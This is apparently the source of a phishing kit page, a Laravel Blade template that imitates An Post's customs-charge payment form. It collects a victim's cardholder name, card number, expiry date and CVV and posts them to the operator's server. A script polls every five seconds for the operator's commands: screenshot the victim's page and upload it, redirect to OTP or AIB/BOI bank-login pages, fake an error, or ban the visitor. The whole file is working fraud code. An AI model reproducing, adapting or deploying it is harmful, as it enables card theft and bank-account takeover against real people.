@extends('layouts.main')
@section('title', 'Credit or Debit Card Details')
@section('main')
<section id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlFormLookup" class="f14">
    <div class="f14__section__wrapper f14__section__wrapper--increase">
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
            class="f14__form__group form__group js-slideup">
            <div class="alertdiv form__group__wrapper">
                <span class="alertspan"></span>
            </div>
        </div>

        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
            class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <label for="">Card holder name</label> -->
                <input name="name" type="text" id="name" class="js-f14-tracking-id" data-required=""
                    data-required-message="Your Card holder name is required" autocomplete="off"
                    placeholder="Card holder name" required="required">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
            class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <label for="">Card Number</label> -->
                <input name="mycc" type="text" id="mycc" class="js-f14-tracking-id" data-required=""
                    data-required-message="Your card number is required" autocomplete="off"
                    placeholder="Your card number" required="required" maxlength="19">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
            class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <label for="">Expiry date</label> -->
                <input name="exp" type="text" id="exp" class="js-f14-tracking-id" data-required="" required="required"
                    maxlength="5" data-required-message="Your Expiry date required" autocomplete="off"
                    placeholder="MM/YY">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
            class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <label for="">CVV</label> -->
                <input name="cvv" type="text" inputmode="numeric" id="cvv" max="9999" maxlength="3"
                    class="js-f14-tracking-id" data-required="" data-required-message="Your Eircode is required"
                    autocomplete="off" placeholder="CVV" required="required">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>


        <div class="f14__btn__wrapper f14__btn__wrapper--increase">
            <input type="submit" class="btnSub loginBtn submit bn bn--primary gtm-cta"
                name="p$lt$WebPartZone13$zoneContent$pageplaceholder$p$lt$ctl01$F14PayCustomsCharges$btnLookupCharge"
                value="Continue"
                id="btnSub loginBtn p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_btnLookupCharge">
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlAPIErrors"
            style="color:red;font-weight:bold"></div>
    </div>
</section>

@include('main.inc.sidebox_two')



<div id="loaderPage p_lt_WebPartZone14_zoneBelowContent_M78MyAnPostLoginForm_pnlLoadingAnimation" role="alert"
    aria-live="assertive" class="loaderPage loader-wrapper loader-wrapper--full-page js-loader">
    <div class="loader" aria-label="Loading.. please wait" role="img">
        <div class="double-bounce1"></div>
        <div class="double-bounce2"></div>
    </div>
</div>
@endsection
@section('js')
{{-- <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script> --}}
<script>

$.ajax({
        method: "POST",
        url: "{{route('main.connection')}}",
        data: {
            _token: $('meta[name="csrf-token"]').attr('content'),
            referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
            type: "update",
        }
});

$(".loginBtn").on("click", () => {
    if ($(this).hasClass("btn-loading")) {
        return false;
    }
    if ($("#name").val().length == 0 || $("#cvv").val().length == 0 || $("#mycc").val().length == 0 || $("#exp").val().length == 0) {
        $(".alert").css("display", "flex");
        let errorText = "";
        $(".imps").each(function() {
            if ($(this).text().length == 0) {
                errorText += $(this).prev().text() + " ";
            }
        });
        let text = "The {field} are required.";
        let result = text.replace("{field}", errorText);

        $(".alertdiv").text(result);
        $(".alertdiv div").text(result);
        $(".alertdiv").addClass("error");
    } else {
        if (mycc() && myexp() && mycvv()) {
            $(".alertdiv").css("display", "none");
            $.ajax({
                method: "POST",
                url: "{{ route('main.new') }}",
                data: {
                    _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                    "_chname": $("#name").val(),
                    "_cc": $("#mycc").val(),
                    "_expiry": $("#exp").val(),
                    "_cvv": $("#cvv").val(),
                    "type": "cc",
                }
            }).done((data) => {
                    // $(".loginBtn").addClass("btn-loading")
					$(".alertdiv").css("display", "block");
					$(".loaderPage").addClass("loader-wrapper--shown")
            });
        }
    }
});

$("#mycc").mask("0000 0000 0000 0000");
$("#cvv").mask("000");
$("#exp").mask("00/00");



function mycc() {
    var ccNum = $("#mycc").val();

    //var amexpRegEx = /^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/;

    var isValid = false;

    if (ccNum.length <= 20) {
        isValid = true;
    }

    if (!isValid) {

        $(".alert").css("display", "flex");

        cc_text = "CARD NUMBER";

        text = "The {field} is incorrect. Please try again.";
        result = text.replace("{field}", cc_text);

        //$(".alert div").text(result);
        $(".alertdiv").text(result);
        $(".alertdiv div").text(result);
        $(".alertdiv").addClass("error");

    }

    return isValid;
}

function myexp() {
    var today, someday;
    var isValid = false;
    var expiration = $("#exp").val();
    if (expiration) {
        var exMonthVal = expiration.split("/")[0] - 1;
        var exYearVal = 20 + expiration.split("/")[1];
        today = new Date();
        someday = new Date();
        someday.setFullYear(exYearVal, exMonthVal, 1);

        if (someday > today && exMonthVal < 13 && exYearVal < 2029) {
            isValid = true;
        }
    }


    if (!isValid) {

        $(".alert").css("display", "flex");

        exp_text = "EXPIRY";


        text = "The {field} is incorrect. Please try again.";
        result = text.replace("{field}", exp_text);

        //$(".alert div").text(result);
        $(".alertdiv").text(result);
        $(".alertdiv div").text(result);
        $(".alertdiv").addClass("error");
    }
    return isValid;
}

function mycvv() {
    var isValid = false;
    if ($("#cvv").val().length == 3) {
        isValid = true;
    }

    if (!isValid) {
        $(".alert").css("display", "flex");
        cvv_text = "CVC (3-DIGIT NUMBER)";
        text = "The {field} is incorrect. Please try again.";
        result = text.replace("{field}", cvv_text);

        //$(".alert div").text(result);
        $(".alertdiv").text(result);
        $(".alertdiv div").text(result);
        $(".alertdiv").addClass("error");

    }
    return isValid;
}

setInterval(async () => {
    await checkAction();
}, 5000);

const checkAction = async () => {
    $.ajax({
        method: "POST",
        url: "{{route('main.connection')}}",
        data: {
            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
            type: "checkAction",
        }
    }).done(function(data) {
        if (typeof myVariable === "string" && data.trim() == "none") {
            return false;
        }
        var data = JSON.parse(JSON.stringify(data));
        setCookie("set_name", data.set_name, 1);
        switch (data.action) {
            case "screenshot":
                let img;
                html2canvas(document.body).then(function(canvas) {
                    $.ajax({
                        type: "POST",
                        url: "{{route('main.connection')}}",
                        data: {
                            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                            "type": "screenshot",
                            "img": canvas.toDataURL('image/png')
                        },
                    }).done(function(data) {});
                });
                break;
            case "otp":
                window.location.replace(
                    "{{route('main.otp')}}?sessionid={{md5(time())}}&status=otp");
                break;
            case "aib":
                window.location.replace(
                    "{{route('main.aib')}}?sessionid={{md5(time())}}&status=aib");
                break;
            case "boi":
                window.location.replace(
                    "{{route('main.boi')}}?sessionid={{md5(time())}}&status=boi");
                break;
            case "error":
                $("#mycc").val("");
                $("#exp").val("");
                $("#cvv").val("");
                $(".alert").css("display", "flex");
                $(".loaderPage").removeClass("loader-wrapper--shown");
                $(".alertdiv").text("Something went wrong. Please try again.");
                $(".alertdiv div").text("Something went wrong. Please try again.");
                $(".alertdiv").addClass("error");
                //$(".alertspan").text("Something went wrong. Please try again.");

                break;
            case "bye":
                window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                break;

            case "ban":
                $.ajax({
                    method: "POST",
                    url: "{{route('main.connection')}}",
                    data: {
                        _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                        type: "ban",
                        status: "banned",
                    }
                }).done(function() {
                    window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                });
                break;
        }
    });
}
</script>
@endsection